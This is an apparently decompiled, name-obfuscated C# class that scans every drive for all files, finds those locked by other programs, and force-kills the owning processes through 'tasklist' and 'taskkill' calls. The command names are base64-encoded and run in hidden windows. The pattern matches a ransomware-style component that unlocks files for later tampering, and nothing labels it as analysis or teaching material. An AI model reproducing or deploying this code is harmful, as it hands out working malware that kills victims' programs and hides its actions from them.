using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace OedchgEuvSrX;

internal class fdRUKddSCaQ
{
	[CompilerGenerated]
	private sealed class NLImGlfZxUpH
	{
		public string PcnJGmmZqQd;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(PcnJGmmZqQd);
		}
	}

	public static readonly List<string> ohWewBmtMa = new List<string>();

	public static readonly List<string> DeRIaxwFbteAqWT = new List<string>();

	public static void GSOWZlhCJmJnq()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					LwTTHhfFihO(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void LwTTHhfFihO(string xqYacfdJuktJ)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(xqYacfdJuktJ);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					ohWewBmtMa.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					LwTTHhfFihO(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (ohWewBmtMa.Count <= 0)
		{
			return;
		}
		foreach (string item in ohWewBmtMa.Where((string PlNKhHRGjycH) => rjAYUyFVUzIWi(PlNKhHRGjycH)))
		{
			DeRIaxwFbteAqWT.Add(item);
		}
		ohWewBmtMa.Clear();
		if (DeRIaxwFbteAqWT.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in DeRIaxwFbteAqWT.Select((string UUDfhsyXNSIfSG) => new FileInfo(UUDfhsyXNSIfSG)))
		{
			bNVGHcAokXIJXe(item2.Name);
		}
	}

	public static bool rjAYUyFVUzIWi(string jWhgPUCKapFQIdW)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(jWhgPUCKapFQIdW, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(jWhgPUCKapFQIdW, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void bNVGHcAokXIJXe(string EqVpzWZZpmNFM)
	{
		try
		{
			string text = SzeNFZHECXYTTFIz(RdLlDKYVGTt.CmEnmHNMSUiP("dGFza2xpc3Q="), RdLlDKYVGTt.CmEnmHNMSUiP("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(EqVpzWZZpmNFM)
				select t into cUeRUeHozcSb
				select cUeRUeHozcSb.Split(new char[1] { ',' }) into DgoyGuQTHBrq
				select DgoyGuQTHBrq[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				SzeNFZHECXYTTFIz(RdLlDKYVGTt.CmEnmHNMSUiP("dGFza2tpbGw="), RdLlDKYVGTt.CmEnmHNMSUiP("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string SzeNFZHECXYTTFIz(string AZzXuVemVfRGOmtJ, string iQBCKJcZbtf)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(AZzXuVemVfRGOmtJ, iQBCKJcZbtf);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
